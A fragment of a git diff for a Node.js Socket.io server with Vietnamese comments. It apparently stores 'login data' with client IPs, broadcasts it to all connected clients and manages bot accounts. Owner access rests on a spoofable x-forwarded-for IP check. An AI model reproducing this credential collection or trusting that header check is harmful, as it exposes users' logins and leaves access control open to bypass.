@@ -6,8 +6,13 @@ const app = express();
 const server = http.createServer(app);
 const io = new Server(server);
 
-// Cấu hình phục vụ file tĩnh nếu bạn để file html trong thư mục public (hoặc cùng cấp)
+// Phục vụ các file tĩnh (CSS, JS, v.v.)
 app.use(express.static(__dirname));
+
+// Fix lỗi "Cannot GET /" bằng cách trỏ thẳng về index.html
+app.get('/', (req, res) => {
+    res.sendFile(__dirname + '/index.html');
+});
 
 let isMaintenance = false;
 const OWNER_IP = '1.53.131.94'; // IP duy nhất được quyền tắt bảo trì
@@ -15,21 +20,17 @@ let collectedData = [];
 let accounts = [];
 
 io.on('connection', (socket) => {
-    // Lấy IP của client kết nối (hỗ trợ proxy nếu có)
     const rawIp = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
     const clientIp = rawIp ? rawIp.replace('::ffff:', '') : '';
 
-    // Gửi trạng thái bảo trì và danh sách ban đầu cho client mới kết nối
     socket.emit('maintenance_status', isMaintenance);
     socket.emit('init_accounts', accounts);
     socket.emit('sync_collected_data', collectedData);
 
-    // Xử lý bật/tắt bảo trì
     socket.on('toggle_maintenance', (status) => {
-        // Nếu hành động là TẮT bảo trì (status === false), bắt buộc phải kiểm tra IP
         if (status === false && clientIp !== OWNER_IP) {
             socket.emit('log', '❌ CẢNH BÁO: IP của bạn không có quyền tắt chế độ bảo trì!');
-            return; // Chặn không cho thực hiện
+            return;
         }
 
         isMaintenance = status;
@@ -37,7 +38,6 @@ io.on('connection', (socket) => {
         io.emit('log', `⚙️ Trạng thái bảo trì đã được ${isMaintenance ? 'BẬT' : 'TẮT'} bởi IP: ${clientIp}`);
     });
 
-    // Thu thập dữ liệu đăng nhập
     socket.on('collect_data', (data) => {
         const entry = {
             ip: clientIp,
@@ -58,7 +58,6 @@ io.on('connection', (socket) => {
         }
     });
 
-    // Quản lý bot (Ví dụ cơ bản)
     socket.on('add_account', (acc) => {
         const newAcc = {
             id: Date.now().toString(),
